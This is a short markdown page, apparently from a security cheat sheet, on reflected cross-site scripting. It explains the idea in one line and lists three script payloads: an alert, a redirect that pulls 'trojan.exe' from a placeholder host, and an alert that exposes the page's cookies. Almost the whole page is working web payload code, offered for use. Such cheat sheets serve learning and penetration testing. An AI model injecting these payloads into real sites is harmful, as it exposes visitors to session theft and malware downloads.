---
description: Reflected Cross Site Scripting
---

# XSS | Reflected

If the server has an input space, you can try to index the JavaScript code on the web page.

### Payloads:

```html
<script>alert("hacked")</script>
```

```html
<script>document.location="http://localhost/trojan.exe"</script>
```

```html
<script>alert(document.cookie)</script>
```
